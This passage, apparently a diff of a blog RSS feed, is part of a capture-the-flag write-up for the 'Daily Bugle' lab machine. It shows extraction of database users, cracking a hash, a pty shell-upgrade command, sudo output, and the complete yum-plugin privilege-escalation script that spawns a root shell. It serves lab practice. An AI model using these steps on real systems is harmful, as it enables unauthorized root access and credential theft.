+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - Found table: &amp;lt;redacted&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - Extracting users from &amp;lt;redacted&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>$&lt;span class="o">]&lt;/span> Found user &lt;span class="o">[&lt;/span>&lt;span class="s1">&amp;#39;&amp;lt;redacted&amp;gt;&amp;#39;&lt;/span>&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - Extracting sessions from &amp;lt;redacted&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>After finding the hash of Jonah, I just went to hashidentifier and cracked it.&lt;/p>
+&lt;p>Now for creating a reverse shell I found this Article online: &lt;a class="link" href="https://www.hackingarticles.in/joomla-reverse-shell/" target="_blank" rel="noopener"
+>https://www.hackingarticles.in/joomla-reverse-shell/&lt;/a>&lt;/p>
+&lt;p>I followed and I got a rev shell.&lt;/p>
+&lt;p>I upgraded the shell using:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python -c &lt;span class="s2">&amp;#34;import pty; pty.spawn(&amp;#39;/bin/bash&amp;#39;)&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>And found the jjameson’s password inside linpeas.&lt;/p>
+&lt;p>Now we need to become root.&lt;/p>
+&lt;p>I used sudo -l to list all the privileges:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo -l
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Matching Defaults entries &lt;span class="k">for&lt;/span> jjameson on dailybugle:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> env_reset, &lt;span class="nv">env_keep&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">env_keep&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="s2">&amp;#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">env_keep&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="s2">&amp;#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">env_keep&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="s2">&amp;#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">env_keep&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="s2">&amp;#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">secure_path&lt;/span>&lt;span class="o">=&lt;/span>/sbin&lt;span class="se">\:&lt;/span>/bin&lt;span class="se">\:&lt;/span>/usr/sbin&lt;span class="se">\:&lt;/span>/usr/bin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User jjameson may run the following commands on dailybugle:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>ALL&lt;span class="o">)&lt;/span> NOPASSWD: /usr/bin/yum
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>And then went to gtfobins and used this for a root shell:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">TF&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$(&lt;/span>mktemp -d&lt;span class="k">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat &amp;gt;&lt;span class="nv">$TF&lt;/span>/x&lt;span class="s">&amp;lt;&amp;lt;EOF
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">[main]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">plugins=1
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">pluginpath=$TF
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">pluginconfpath=$TF
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat &amp;gt;&lt;span class="nv">$TF&lt;/span>/y.conf&lt;span class="s">&amp;lt;&amp;lt;EOF
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">[main]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">enabled=1
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat &amp;gt;&lt;span class="nv">$TF&lt;/span>/y.py&lt;span class="s">&amp;lt;&amp;lt;EOF
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">import os
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">import yum
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">requires_api_version=&amp;#39;2.1&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">def init_hook(conduit):
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> os.execl(&amp;#39;/bin/sh&amp;#39;,&amp;#39;/bin/sh&amp;#39;)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo yum -c &lt;span class="nv">$TF&lt;/span>/x --enableplugin&lt;span class="o">=&lt;/span>y
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item></channel></rss>
